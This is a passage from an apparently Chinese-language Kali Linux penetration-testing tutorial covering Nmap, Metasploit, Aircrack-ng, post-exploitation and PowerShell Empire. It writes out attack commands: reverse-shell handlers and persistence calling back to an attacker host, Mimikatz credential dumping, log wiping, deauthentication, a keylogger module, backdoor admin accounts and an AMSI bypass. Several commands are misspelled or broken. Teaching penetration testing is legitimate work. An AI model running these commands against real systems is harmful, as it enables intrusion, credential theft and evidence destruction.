- `default:` 基础侦察脚本
- `discovery:` 服务发现
- `exploit:` 尝试已知漏洞利用
- `brute:` 执行暴力破解登录
- `malware:` 探测恶意软件
- `vuln:` 识别漏洞

### 使用特定脚本

按类别运行多个脚本：

```
nmap --script "default,vuln" 192.168.1.1
```

## Nmap 实践技巧

- 在嘈杂环境中，始终从隐身扫描开始。
- 时间受限时使用 `-T4` 加速扫描，但在 IDS/IPS 环境中要小心。
- 以各种格式保存输出：

```
nmap -sS -sV -oA scan_results 192.168.1.1
```

这将创建：

- `.nmap`（普通输出）
- `.xml`（用于 Metasploit 等工具）
- `.gnmap`（可搜索格式）

## 漏洞扫描与分析

在通过侦察识别活动主机和开放服务后，渗透测试流程的下一个逻辑步骤是漏洞扫描与分析。此阶段重点关注可以在后期阶段利用的缺陷。它结合了自动化工具和手动技术，提供了攻击面的视图。本章将探索漏洞扫描的自动化和手动方法。

### 使用 Nmap 脚本发现漏洞

虽然 Nmap 以端口扫描能力闻名，但其脚本引擎 (`NSE`) 包含了一个专门为漏洞检测设计的强大脚本类别。

### 常见漏洞脚本

运行针对漏洞的脚本：

```
nmap --script vuln [target]
```

该命令运行所有标记为 `vuln` 别的脚本，包括检查：

- 特定 CVE 漏洞
- SSL/TLS 配置错误
- Web 应用问题
- SMB 和 RPC 缺陷

### 示例

#### 1. SMB 漏洞

```
nmap --script smb-vuln-ms17-010 192.168.1.100
```

检查 EternalBlue 漏洞。

#### 2. HTTP 漏洞

```
nmap --script http-vuln-cve2006-3392 192.168.1.100
```

检查 PHP-Nuke 的一个已知漏洞。

#### 3. 结合默认和漏洞脚本的综合扫描

```
nmap -sV --script "default,vuln" 192.168.1.100
```

结合服务检测与漏洞脚本。

# 集成 OpenVAS 和 Nikto

像 OpenVAS 和 Nikto 这样的自动化扫描器在识别漏洞方面比 Nmap 更深入，能够提供详细的分析、分类，有时还有修复建议。

## OpenVAS (Greenbone Vulnerability Manager)

OpenVAS 是一个全面的漏洞扫描器，维护着定期更新的已知漏洞数据库。它可以扫描系统，将发现的结果与其 CVE 数据库进行比较，并生成详细报告。

特性：

- 基于 CVE 的漏洞匹配
- 基于 Web 的界面 (`Greenbone Security Assistant`)
- 详细的风险分类
- 计划扫描和报告

基本工作流：

安装 OpenVAS：

```
sudo apt install openvas
```

```
sudo gvm-setup
```

1. 启动服务并访问 Web GUI：

`sudo gvm-start`

2. 登录 Greenbone Security Assistant（通常为 `https://localhost:9392`）并运行扫描。

3. 查看报告中的严重性评分、CVSS 分数和修复建议。

OpenVAS 适用于深度的基础设施和服务器漏洞评估。

## Nikto

Nikto 是一个轻级的命令行 Web 服务器扫描器，用于识别潜在的 Web 漏洞和配置错误。

### Nikto 的内容：

- 过时的软件版本
- 危险的文件和脚本
- 不安全的 HTTP 头部
- 常见的配置问题

### 使用方法：

```
nikto -h http://192.168.1.100
```

针对 HTTPS 和详细输出：

```
nikto -h https://192.168.1.100 -Display V
```

Nikto 特别适用于快速评估自定义 Web 应用并检测显而易见的漏洞。

# 手动枚举技术

虽然自动化工具非常强大，但它们无法检测每一个漏洞——特别是逻辑漏洞、链式攻击或微妙的配置错误。这就是手动枚举用用场。

## 手动技术示例

### 1. Banner 抓取 (Banner Grabbing)

使用 `netcat`、`telnet` 或 `curl` 手动检查开放服务的响应。

```
nc 192.168.1.100 80
```

```
curl -I http://192.168.1.100
```

### 2. HTTP 目录和文件枚举

如 `dirb`、`gobuster` 和 `feroxbuster` 等工具有助于识别隐藏的文件和目录。

```
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
```

### 3. 枚举 SMB 共享

```bash
smclient -L //192.168.1.100 -U anonymous
```

### 4. 提取服务配置



手动检查 Web 应用或 CMS 上的版本

查看 `robots.txt`、`sitemap.xml`、`.git` 目录

对参数和表单进行手动模糊 (`fuzzing`)

手动测试允许更深入的洞察，通常能发现扫描无法无法的业务逻辑漏洞或缺陷。

# 使用 Exploit-DB 和 SearchSploit 进行漏洞利用

一旦识别漏洞，下一步就是寻找合适的利用程序。`Exploit-DB` 和 `SearchSploit` 是实现此目的的重要资源。

## Exploit-DB

`Exploit-DB` 是利用代码和漏洞研究的公共存档。它包含了针对以下内容的：

- Web 应用
- 本地和远程漏洞
- 权限提升
- 硬件/固件

你可以使用关键词、`CVE` 编号或软件版本搜索利用程序。

## SearchSploit

`SearchSploit` 是 `Exploit-DB` 存档的离线命令行界面，随 Kali Linux 预。

### 使用示例

#### 1. 搜索软件

```bash
searchsploit vsftpd
```

#### 2. 使用 CVE 搜索

```bash
searchsploit CVE-2017-0144
```

#### 3. 镜像利用程序

```bash
searchsploit -m linux/local/37292.c
```

#### 4. 更新漏洞数据库

```bash
searchsploit -u
```

该工具在实战中极其有用，特别是在没有互联网访问的隔离环境中。

# 使用 Metasploit 框架进行利用

`Metasploit Framework` 是渗透测试人员和道德黑客工具库中最强大、最广泛使用的工具之一。它提供了一个全面的环境，用于跨广泛系统的漏洞发现、利用和后渗透利用。作为一个开源项目，`Metasploit` 集成了各种利用程序、载荷、编码器和辅助模块，以实现有效且灵活的渗透测试。

在本章中，我们将深入探索 `Metasploit Framework`，包括其架构、选择利用程序和载荷的过程、使用 `Meterpreter` 进行后渗透、编写自定义利用程序以及在受害系统中维持持久化。

## Metasploit 架构概述

`Metasploit Framework` 遵循模块化架构，使其具有适应性和扩展性。在 `Metasploit` 内部交互的核心组件包括：

### 1. 核心 Core

`Metasploit` 的核心模块负责管理框架的内部操作，包括处理用户输入、管理利用程序和载荷以及处理攻击。它是整合其他其他模块的基础。

### 2. 模块 Modules

`Metasploit` 的强大在于其丰富的模块集合，使渗透测试人员能够执行攻击、收集信息并执行后渗透任务。`Metasploit` 中的模块分类如下：

- **Exploits 利用程序**：设计用于利用目标系统漏洞的代码。
- **Payloads 载荷**：在成功利用后运行在目标系统上的程序或命令。
- **Encoders 编码器**：用于修改载荷以规避病毒和其他安全措施检测的工具。
- **Post-exploitation 后渗透**：在成功利用后使用的模块，用于维持持久化或提升权限等任务。
- **Auxiliary 辅助**：用于扫描、枚举和其他侦察活动的非利用类模块。

### 3. 数据库 Database

`Metasploit` 使用数据库存储有关目标、漏洞和会话的信息。这使得渗透测试过程的跟踪和管理更容易。

### 4. Meterpreter

`Meterpreter` shell 是一种强大且动态扩展的载荷，有助于后渗透活动。它完全在内存中运行，留下极少的痕迹，并为进一步的利用和持久化提供广泛的功能。

### 5. 接口 Interfaces

可以通过多种接口访问 `Metasploit`：

- **msconsole**：命令行界面 `CLI`，提供对 `Metasploit Framework` 功能的完全访问。
- **msfvenom**：用于创建自定义载荷并对其编码的命令行工具。
- **Web Interface Web界面**：允许通过浏览器远程访问 `Metasploit` 以方便使用。
- **API**：允许将 `Metasploit` 集成到其他工具系统中。

### 6. 社区和文档 Community and Documentation

`Metasploit` 拥有庞社区和丰富的文档，使得渗透测试人员更容易学习、贡献并有效使用该框架。

## 利用程序和载荷选择

### 1. 选择正确的利用程序

利用目标的第一步是选择正确的利用程序。这取决于多个因素：

- 目标操作系统 `OS`：利用程序必须针对特定的 `OS` 设计，例如 `Windows`、`Linux`。
- 软件漏洞：利用程序通常针对特定的软件版本。
- 可利用条件：需要满足某些条件，例如目标系统可达、受影响端口已开启且目标应用程序处于可利用状态。

`Metasploit` 提供了一种使用 `search` 命令搜索和选择利用程序的简易方法：

```bash
msf > search vsftpd
```

该命令搜索任何与 `vsftpd` 相关的利用程序并显示可用模块。

#### 示例：利用程序选择

如果你的目标是受漏洞的 `MS08-067` 一个旧的 `Microsoft Windows` 漏洞，以下命令将选择相关的利用程序：

```bash
msf > use exploit/windows/smb/ms08_067_netapi
```

### 2. 选择正确的载荷

选择利用程序后，下一步是选择成功后运行在目标系统上的载荷。`Metasploit` 中的载荷可以是交互式 `shell`、反向 `shell` 或 `Meterpreter` 会话。

载荷的选择取决于攻击目标：

- **Reverse Shells 反向 shell**：连接回攻击者的机器，提供命令 `shell`。
- **Bind Shells 绑定 shell**：在目标系统上开启监听端口供攻击者连接。
- **Meterpreter**：这是最先进且最常用的载荷，提供了完整的后渗透能力。

查看所选利用程序的可用载荷：

```bash
msf > show payloads
```

例如，在选择 `MS08-067` 利用程序后，你可以选择 `Meterpreter` 载荷：

```bash
msf > set PAYLOAD windows/meterpreter/reverse_tcp
```

这配置利用程序使用 `Meterpreter` 反向 `shell` 载荷。

## Meterpreter Shell 使用与后渗透利用

`Meterpreter` 是一种复杂且多功能的载荷，可方便各种后渗透测试活动。一旦与目标系统建立成功连接，就会启动 `Meterpreter` shell，并提供各种命令和功能。

### 1. 基础 Meterpreter 命令

- `sysinfo`: 显示基本系统信息 `操作系统、架构等`。
- `getuid`: 返回当前运行 `Meterpreter` 的用户账户。
- `ps`: 列出目标系统上运行的进程。
- `shell`: 进入目标系统的标准命令 `shell`。
- `upload`: 将文件从攻击者系统上传到目标系统。
- `download`: 将文件从目标系统下载到攻击者系统。
- `keyscan_start`: 开始在目标系统上记录按键记录。
- `screenshot`: 截取目标系统的桌面截图。
- `hashdump`: 从目标系统转储密码哈希值。

### 2. 后渗透任务

`Meterpreter` 提供了强大的后渗透能力，用于进一步攻破系统：

- **权限提升 Privilege Escalation**：如果攻击者获得了低权限 `shell`，他们可以尝试利用已知漏洞或使用本地漏洞等技术将权限提升到管理员/`root` 级别。
- **跳转 Pivoting**：如果受害系统具有对其他机器的网络访问权限，跳转技术允许攻击者访问之前无法到达的系统。
- **持久化 Persistence**：可以使用 `Meterpreter` 安装后门，以便在系统重启或清理后保持对系统的持续访问。

### 3. 会话管理

`Metasploit` 可以同时管理多个 `Meterpreter` 会话。例如：

```
msf > sessions -i 1
```

此命令连接到会话 `1`，允许你与受攻击的目标进行交互。

# 创建和修改自定义漏洞利用

`Metasploit` 提供了一个灵活的框架，用于为特定目标创建自定义的漏洞利用。在处理零日漏洞或公共利用无法按预期工作时，这种方法特别有用。

### 1. 创建自定义漏洞利用

自定义利用通常用 `Metasploit` 使用的 `Ruby` 语言编写。要创建一个自定义利用，你需要定义几个组件：

- **载荷 Payload**：成功利用后在目标机器上运行的恶意代码。
- **利用代码 Exploit Code**：触发漏洞的代码。
- **目标 Target**：被攻击的特定系统或配置。

创建一个自定义漏洞利用的示例：



```
msf > use exploit/multi/handler
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.10
msf > set LPORT 4444
msf > exploit
```

这创建了一个 Meterpreter 反向 shell 的监听器，可以根据你的需求进行调整。

### 修改现有漏洞利用

Metasploit 允许轻松修改现有的漏洞利用以更好地适应特定目标。你可以调整 `modules/exploits` 目录下的设置、参数或载荷，确保你的自定义修改符合渗透测试目标。

# 使用 Metasploit 维持持久化

在成功利用系统后，保持对目标机器的持续控制访问至关重要。Metasploit 提供了几种确保持久化的方法。

## 通过 Meterpreter 实现持久化

使用 Meterpreter，你可以创建一个持久化后门，即使在系统重启或用户注销后也能自动重新连接。Meterpreter 的持久化功能简单且有效：

```
meterpreter > run persistence -U 5 -p 4444 -r 192.168.1.10
```

此命令创建一个每5秒重连一次的持久化反向 shell，确保持续访问。

### 使用 Metasploit 创建持久化后门

Metasploit 可以载荷注入系统服务或创建新的计划任务以确保访问持久化。对于 Windows 系统，这可能涉及创建一个每次系统启动时执行 Meterpreter 反向 shell 的计划任务。

# 使用 Aircrack-ng 套件进行无线攻击

Aircrack-ng 套件是一组强大的工具，用于无线网络审计和渗透测试。它专注于捕获和分析无线流量、破解 WEP 和 WPA/WPA2 加密、执行取消攻击等。Aircrack-ng 是渗透测试工具箱中评估无线网络安全的关键工具。

本章将探索无线网络基础、捕获和破解 WPA/WPA2 握手的过程、取消攻击、创建邪恶节点攻击、监控无线流量以及使用 Aircrack-ng 的高级技术。

## 无线网络基础

在深入研究无线攻击细节之前，理解无线网络涉及的基本组件和协议是非常重要的。

### 无线局域网 (WLANs)

无线局域网 `WLAN` 是一种在有限地理区域（如家庭、办公室或校园）内无线连接设备的网络。它使用无线电在设备之间传输数据，通常使用 IEEE 802.11 标准（Wi-Fi）。

### WLAN 的基本组件

- **接入点 (APs)**：为客户端（如笔记本电脑、智能手机）提供无线连接的设备。AP 作为无线设备和有线网络之间的中介。
- **客户端 (Clients)**：连接到接入点以访问无线设备。
- **SSID (服务集标识符)**：WLAN 的名称，用于区分一个网络与其他网络。
- **BSSID (基本服务集标识符)**：用于识别网络的接入点的 MAC 地址。
- **加密 (Encryption)**：无线网络可以进行加密以保护通信，防止未经授权的。常见的加密方法包括 WEP、WPA 和 WPA2。

### 无线网络标准

- **WEP (有线等效隐私)**：一种过时且脆弱的加密标准。可以使用 Aircrack-ng 等现代工具轻松破解。
- **WPA (Wi-Fi 安全访问)**：WEP 的改进，具有更强的加密，但仍然容易受到字典攻击等攻击。
- **WPA2 (Wi-Fi 安全访问 II)**：最安全的无线加密标准，利用 AES（高级加密标准）。WPA2 仍在广泛使用，但在某些条件下仍受攻击。

### 射频 (RF) 基础

无线网络运行在不同的频段，通常为 2.4 GHz 和 5 GHz 频段。2.4 GHz 段更加拥挤，许多设备在使用，而 5 GHz 段较拥挤，提供更快的数据速率。

## 捕获握手并破解 WPA/WPA2

无线网络渗透测试中最常见的任务之一是捕获 WPA/WPA2 握手并尝试破解加密密钥。当客户端连接到接入点建立连接时，就会握手。

### 捕获 WPA/WPA2 握手

为了捕获 WPA/WPA2 握手，攻击者需要嗅探无线网络流量并等待客户端连接到接入点。握手是客户端和接入点之间的四次交换，包含了用于破解网络密码的关键信息。

#### 将无线接口设置为监视模式的步骤

`将无线接口设置为监视模式`：此模式允许你的无线适配器捕获附近所有的无线流量。

```
airmon-ng start wlan0
```

- **扫描网络**：使用 `airodump-ng` 扫描可用的无线网络并识别目标接入点。

```
airodump-ng wlanmon
```

一旦你找到了目标网络，就开始捕获数据包并寻找握手。这可以通过指定目标网络的 BSSID 和信道来实现。

```
airodump-ng --ssid <BSSID> -c <channel> -w wlanmon
```

- **等待客户端连接**：捕获握手最简单的方法是等待合法客户端连接到网络，触发四次握手。
- **强制重连**：如果没有客户端连接，你可以使用取消攻击强制客户端断开连接，这将促客户端重新连接，从而让你能够捕获握手。

```
aireplay-ng --deauth -a <BSSID> wlan0mon
```

### 破解 WPA/WPA2 加密

一旦你获取了握包，就可以尝试使用字典攻击或暴力破解来破解 WPA/WPA2 密码。

使用 Aircrack-ng：在 `.cap` 文件中捕获握包后，使用 `aircrack-ng` 尝试进行破解。

```
aircrack-ng capture.cap -w wordlist.txt
```

- `wordlist.txt` 包含一个潜在密码列表。这种攻击的有效性很大程度上取决于密码的强度和所用字典的质量。
- WPA2-PSK 字典攻击：`aircrack-ng` 可以各种算法将字典中的每个条目与握包进行对比。如果密码存在于列表中，它将被破解。

#### 破解 WPA/WPA2 的局限性

- 弱密码：WPA/WPA2 加密的强度完全取决于所使用的密码。弱密码很容易被破解。
- 更长密码：即使使用高性能硬件，更强、更长的密码破解所需的时间呈指数级增长。

## 认证攻击与恶意双生攻击

### 去认证攻击

去认证攻击是一种拒绝服务（DoS）攻击，通过向客户端和接入点发送去认证帧，强制客户端断开与接入点的连接。随后客户端会被强制重新连接，从而可能触发握包捕获。

#### 执行去认证攻击的步骤

启动去认证：使用 `airplay-ng` 工具向目标网络的特定客户端或所有客户端发送去认证包。

```
airplay-ng --deauth 10 -a <BSSID> -c <client MAC> wlan0mon
```

这向客户端发送10个去认证包，导致其断开并重新连接，为捕获握包提供机会。

### 恶意双生攻击

恶意双生攻击涉及创建一个模仿合法接入点的伪造接入点。这会误导客户端，使其连接到攻击者的伪造 AP 而不是合法的接入点。

#### 恶意双生攻击的步骤

设置伪造 AP：使用 Aircrack-ng 套件中的 `Airbase-ng` 创建一个与目标接入点 SSID 相同的伪造 AP。

```
airbase-ng -e <SSID> -c <channel> wlan0mon
```

- 捕获握包：一旦客户端连接到你的伪造 AP，你就可以捕获 WPA/WPA2 握包，就像它们连接到合法 AP 一样。
- 中间人：设置恶意双生后，你还可以实施中间人攻击（MitM），拦截并操控客户端与接入点之间的流量。

## 监控和嗅探无线流量

Aircrack-ng 的核心功能之一是监控和嗅探无线流量。这允许渗透测试人员收集价值信息，例如识别漏洞网络、获取 BSSID、捕获握包等。

### 数据包嗅探

要嗅探无线流量，你可以使用 `airodump-ng`，它可以从无线网络捕获数据包。

```
airodump-ng wlan0mon
```

该命令将显示附近所有无线网络的列表，包括 BSSID、SSID、通道、加密类型和速率等信息。

### 捕获数据包

你可以从特定网络捕获数据包并存储起来以便后续分析。捕获的数据包可能包括认证、关联和数据包，这些对于破解加密很有用。

```
airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
```

### 嗅探 WEP 和 WPA 破解

一旦捕获了数据包，Aircrack-ng 允许对这些数据包进行分析以破解之前章节讨论过的 WEP 或 WPA 加密。

## 高级 Aircrack-ng 使用与自动化

对于高级用户，Aircrack-ng 可以被自动化并用于更复杂的无线审计任务。

### 自动化捕获握包

自动化捕获握包和攻击网络的过程可以节省时间并提高效率。你可以编写脚本处理去认证攻击和捕获过程，自动触发 WPA/WPA2 密码破解。

示例脚本：



```bash
#!/bin/bash
### 自动捕获 WPA 握包
airmon-ng start wlan0
airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon & sleep 5
aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

### 2. 分布式破解

为了加速 WPA/WPA2 破解，你可以使用 `Hashcat` 或 `John the Ripper` 等工具将破解任务分配到多台机器上，这两个工具在破解大型数据集方面非常高效。

### 3. 将 Aircrack-ng与其他工具集成

对于更高级用法，可以将 `Aircrack-ng` 与用于数据包分析的 `Wireshark` 或用于额外的无线网络检测和监控的 `Kismet` 集成。

## 后渗透技术与横向移动

在渗透测试或真实攻击中获得初始访问后，开始后渗透。此阶段涉及探索受损系统、收集凭据、提升权限、维持访问以及在网络内部横向移动以扩大控制并访问敏感资产。

后渗透的最终目标包括建立持久化、收集情报、提升权限、横向扩散并在最终不被发现的情况下渗透数据。

## 维持访问与持久化

持久化确保攻击者在系统重启或用户注销后仍能保留对受损机器的访问。这一步对于长期利用、数据窃取或远程访问至关重要。

### 1. 常见的持久化技术

#### a. 计划任务 / Cron 任务

在 Windows 和 Linux 系统上，可以调度恶意脚本或可执行文件定期间隔运行。

Windows:

```
schtasks /create /tr "Updater" "C:\evil.exe" /sc minute /mo 5
```

Linux:

```bash
echo "@reboot /usr/bin/evil.sh" >> /etc/crontab
```

#### b. 启动文件夹 / 注册表 Run Keys

攻击者可以将恶意执行文件放入 Windows 启动文件夹或修改注册表项以确保持久化。

注册表：

```reg
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Updater" /t REG_SZ /d "C:\evil.exe"
```

#### c. DLL 劫持与 COM 劫持

破坏系统 DLL 路径或 COM 对象，在执行合法进程期间加载攻击者控制的代码。

#### d. 后门与反弹 Shell

建立一个启动时回拨攻击者系统的反弹 Shell。

- 工具：`Netcat`, `Metasploit` 持久化模块, `ncat`, `Empire`。

#### e. 植入 SSH 密钥

在 Linux 上，向 `.ssh/authorized_keys` 添加公钥可以实现无密码登录。

```bash
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

## 权限提升技术

在获得脚点后，攻击者通常以低权限运行。权限提升涉及利用配置错误或漏洞来获取 root 或 SYSTEM 级访问。

### 1. Windows 权限提升

#### a. 利用存在漏洞的服务

寻找以 SYSTEM 权限运行但具有写权限或配置错误的的服务。

- 工具：`accesschk`, `winPEAS`, `PowerUp`

#### b. 未加引号的服务路径

如果服务路径包含空格且未加引号，Windows 将尝试执行它找到的第一个匹配文件。

```
sc qc "Service Name"
```

#### c. 不安全的注册表权限

如果用户可以写入被 SYSTEM 进程使用的注册表项，就可以提升权限。

#### d. 令牌仿充 / 特权令牌

使用劫取或提升的令牌以另一个用户的身份运行命令（例如 NT AUTHORITY\SYSTEM）。

#### e. 利用内核漏洞

已知漏洞如 `MS10-015`、`MS16-032` 或 `PrintNightmare`。

### 2. Linux 权限提升

#### a. Sudo 配置错误

拥有特定二进制文件 sudo 权限的用户可以被利用。

```
-l
```

`sudo` 允许运行 `vim`、`bash`、`perl` 等，这可以导致 root shell。

#### b. SetUID 二进制文件

识别设置了 SetUID 位的可以利用的二进制文件。

```bash
find / -perm -4000 -type f 2>/dev/null
```

#### c. 弱的文件权限

由 root 执行的可写配置文件或脚本可能会被劫持。

#### d. 内核漏洞利用

如 `Linux Exploit Suggester`、`LinPEAS` 或 `dirtycow` 等工具可以利用已知的 Linux 内核漏洞。

## 内部网络中的横向移动

横向移动是指在同一个网络内的一个渗透系统移动到另一个系统，以到达更高价值的目标。

### 1. 凭据重用与哈希传递

一旦获取了用户凭据或密码哈希值，请在其他系统上尝试。

- `Pass-the-Hash`: 使用 `Mimikatz` 或 `pthwinexe` 等工具使用 NTLM 哈希。
- `Pass-the-Ticket`: 重用 Kerberos TGT（黄金票 / 银色票攻击）。

### 2. 远程服务与管理工具

a. Windows:

- `PsExec`: 使用 SMB 和管理员凭据执行远程命令。
- `WMI`: 使用 Windows 管理规范进行远程访问。
- `WinRM` / `PowerShell Remoting`: 通常用于域环境。

b. Linux:

- `SSH`: 重用凭据或密钥访问邻近系统。
- `Rsync`, `NFS`, `SSHFS`: 用于文件移动或远程命令执行。

### 3. 网络枚举

识别其他系统、服务和用户。

- 工具：`BloodHound`, `SharpHound`, `CrackMapExec`, `rpcclient`, `enum4linux`

### 4. 跳板与隧道

使用被渗透的系统作为跳板机或代理，访问未外部暴露的内部资源。

- `SOCKS` 代理：通过 `proxychains` 或 `Metasploit` 跳板实现。

## SSH 隧道

```
ssh -L 9999:target.internal:3389 user@pivot-host
```

## 凭据收集与数据外泄

### 1. 凭据收集

a. `Mimikatz`:

从内存中提取明文密码、哈希、PIN 和 Kerberos 票据。

```
privilege::debug
sekurlsa::logonpasswords
```

b. Windows 库与凭据管理器

使用 `VaultCmd` 或 `Mimikatz` 等工具提取存储的凭据。

c. 浏览器凭据导出

从 Chrome、Firefox、Edge 中收集存储的密码。

d. 记录器与剪贴板抓取

使用脚本或恶意软件捕捉输入的密码或剪贴板内容。

e. 导出 SAM & SYSTEM 注册表单元

```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

然后使用 `secretsdump.py` 或 `pwdump`。

### 2. 数据外泄

a. 手动文件提取

复制感兴趣的文件，进行压缩和加密后提取。

```
tar -czf secrets.tar.gz /sensitive/data
```

b. 阶段准备与上传

使用 FTP、SCP、HTTP、DNS 隧道或 C2 通道（例如 `Metasploit Meterpreter`）。

c. 通过云服务或 Web 服务外泄

将数据上传到 Dropbox、Google Drive、Pastebin 或攻击者控制的服务器。

d. 隧道与隐蔽通道

使用 DNS 或 ICMP 等协议在不被发现的情况下将数据传出网络。

## 清除痕迹与反取证策略

为了保持不被发现或阻碍调查人员，攻击者可能会采取**反取证**策略来擦除或隐藏其活动的证据。

### 1. 清除日志

a. Windows

清除事件查看器日志：

```
wevtutil cl System
wevtutil cl Security
```

b. Linux

手动删除日志：

```bash
rm /var/log/auth.log /var/log/syslog
```

- 使用工具覆盖日志或注入伪条目。

### 2. 时间戳修改 (Timestomping)

修改时间戳使文件看起来合法或更老旧。

- 工具：`Metasploit`, `touch`, `SetMACE`

### 3. 隐藏持久化机制

使用无文件恶意软件、仅内存内存负载或加密加载器。

- 隐藏在计划任务、注册表或备用数据流 (ADS) 中。

```
cmd.exe /c echo malicious > file.txt:secret
```



## 4. 内存执行与无文件攻击

使用 PowerShell 或落地二进制文件 (`LOLBins`) 避免接触磁盘。

- 示例：`Invoke-Mimikatz`, `certutil`, `regsvr32`, `mshta`, `rundll32`

### 5. 禁用安全控制

- 使用 `sc stop`、`PowerShell` 或进程注入停止 AV 或 EDR 服务。
- 修改或杀死日志代理。

## 使用 Empire 框架的高级攻击

## PowerShell Empire 简介

`PowerShell Empire` 是一个后渗透和命令与控制 (`C2`) 框架，它利用 PowerShell 代理为攻击者和红队提供了一个在 Windows 环境中执行复杂攻击的稳健平台。该框架最初由 Will Schroeder (@harmj0y) 等人开发，通过为攻击性行动提供模块化、隐蔽且可扩展的框架，填补了基于 PowerShell 的红队测试的关键空白。

在停止并在后由 `BC Security` 团队重新恢复后，现代版本的 Empire 包含了对 `Python3`、跨平台代理的支持，并与 `RESTful APIs`、`混淆` 和 `加密机制` 集成以帮助规避检测。

Empire 在红队行动中被广泛使用是因为：

- 无文件命令执行
- 加密通信（通过 HTTPS 或其他通道）
- 后渗透能力
- 与 `RESTful APIs` 的集成

## 使用监听器 (Listeners)

### 1. 设置监听器

监听器是接收连接的网络服务。Empire 支持以下类型：

- `http`/`https`
- `tcp`
- `named_pipes`

示例：启动监听器

```
usener
set Listener1
set https://attacker-server.com
```

### 2. 启动代理 (Agents)

代理是部署在目标系统上的实际负载。

#### a. 生成加载器 (Stagers)

加载器是用于部署 Empire 的初始负载。你可以生成各种格式加载器：

- `launcher_bat`
- `launcher_psh`
- `launcher_py`
- `DLLs`、`HTA` 文件、宏脚本

示例：`usestager windows/launcher_bat`

#### b. 与代理交互

一旦代理上线（check in），你就可以命令、运行模块、传输文件等。

```
agents
interact <agent_name>
```

## 凭据窃取与键盘记录

凭据收集是 Empire 最强大的能力之一，很大程度上归于其与 `Mimikatz` 的集成。

### 1. 在 Empire 中使用 Mimikatz

```
usemodule credentials/mimikatz/logonpasswords
execute
```

此模块将从内存中导出明文凭据、哈希和 Kerberos 票据。其他与凭据相关的模块：

- `credentials/mimikatz/lsadump`: 从 SAM 或 LSA 导出秘密。
- `credentials/mimikatz/tokens`: 列出或伪造访问令牌。
- `credentials/mimikatz/dcync`: 直接从域控制器提取凭据。

### 2. 键盘记录

Empire 通过原生 PowerShell 模块支持键盘记录，允许攻击者记录击键。

```
usemodule collection/keylogger
set Agent <agent_name>
execute
```

记录器记录到内存并定期将数据传回 Empire 服务器。这可以捕捉登录凭据、聊天和其他敏感输入。

## 文件传输、执行与跳板

### 1. 文件传输

Empire 可以向目标系统上传或下载文件。

上传：

```
upload /path/to/local/file.txt
```

下载：

```
download C:\Users\victim\Desktop\secrets.txt
```

### 2. 执行二进制文件和脚本

Empire 允许执行：

- 本地二进制文件
- PowerShell 单行命令
- Python、`DLL` 或 `shellcode` 负载

示例：

```
shell net hacker pass123 /add
shell net localgroup administrators hacker /add
```

或使用 `usodule` 执行 PowerShell 脚本，如 `Invoke-ReflectivePEInjection` 或 `Invoke-Shellcode`。

### 3. 跳板

Empire 代理可以作为代理跳入内部网络。

- `Invoke-PsTunnel`: 通过代理建立隧道。
- `SOCKS` 代理：允许 Empire 像 VPN 一样中流量。

跳板示例：

```
usodule management/portfwd
set LocalPort 4444
set RemotePort 3389
set RemoteIP 192.168.1.5
execute
```

这将本地端口 `4444` 转发到内部 IP 的 RDP 端口 `3389`。

# Empire 对比现代 EDR 和 AV

Empire 虽然功能强大，但日益受到现代端点检测与响应 (`EDR`) 和反病毒 (`AV`) 解决方案的关注。它依赖于 PowerShell，这是一个被高度监控的攻击向量，这使得传统的 Empire 在防御良好的网络中会产生大量噪声。

### 1. 检测机制

现代防御通过以下方式检测基于 Empire 的攻击：

- `Script Block Logging`：PowerShell 记录运行的每一个命令（事件 ID `4104`）。
- `AMSI` (反病毒扫描接口)：在执行前扫描脚本。
- `行为分析`：监控从 Office 宏生成的 PowerShell、编码命令或 C2 回调。
- `已知指标`：常见的代理和阶段程序（stager）签名会被标记。

### 2. 规避技术

尽管检测有所改进，但 Empire 在与混淆和规避技术结合时依然有效：

- `PowerShell` 混淆：使用 `Invoke-Obfuscation` 等工具规避签名检测。
- `AMSI` 绕过：

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'msiInitFailed' = $true
```

- `编码和加密的阶段程序`：降低静态检测的概率。
- `反射性注入`：直接将载荷运行在内存中而不写入磁盘。
- `命名管道或 HTTPS 监听器`：与合法流量混合。

### 3. 给红队人员的建议

为了在现代防御面前保持有效性：

- 将 Empire 与 C2 重定向器结合使用（例如 Cobalt Strike 的可变配置或 `nginx` 代理）。
- 每次任务轮换唯一的阶段程序 (`stagers`)，以避免签名重叠。
- 关注后渗透利用技术，模拟真实用户行为。
- 集成自定义 PowerShell 模块，以最大限地减少对已知 Empire 组件的依赖。

# 密码攻击与破解策略

在渗透测试和伦理黑客领域，密码攻击在获取未经的访问方面起着关键作用，目的是识别组织安全态势中的弱点。密码仍然是最常见的安全控制措施——而且往往是最薄弱的环节。因此，对于任何使用 `Kali Linux` 的安全专业人员来说，理解密码破解方法都是至关重要的。

本章探讨了`离线和在线密码攻击`、`哈希识别与破解策略`、`凭据重用`以及使用 `Hashcat`, `John the Ripper`, `Crunch`, 和 `Cewl` 等工具创建自定义字典。

## 离线和在线密码破解

### 离线密码破解

离线攻击涉及破解从破解系统中获取的`密码哈希`。由于攻击者已拥有哈希凭据，他们可以无限次尝试而不会引起目标系统的报警。

密码哈值的常见来源：

- `/etc/shadow` (Linux)
- `SAM/SYSTEM` 注册表 (Windows)
- 数据库凭据
- 带有哈值的网络捕获 (例如 SMB 流量中的 `NTLM`)

#### 离线破解的优势

- 隐蔽性（无网络流量）
- 使用 GPU 加速速度更快
- 易于跨机器进行并行化

### 在线密码破解

在线攻击针对运行中的服务，例如：

- `SSH`
- `FTP`
- `RDP`
- `HTTP` 登录表单

示例包括：

- `暴力破解`：尝试所有可能的组合。
- `字典攻击`：尝试常用或目标的密码列表。
- `凭据填充`：尝试从之前的泄露中知的用户名/密码组合。

#### 在线破解的局限性

- 速度慢且噪声大
- 可能会触发账户锁定
- 通常被速率限制或 `IDS/IPS` 拦截

在线破解工具：

- `Hydra`
- `Medusa`
- `Ncrack`



# 使用 Hashcat 和 John the Ripper 进行哈希识别与破解

## 识别哈希

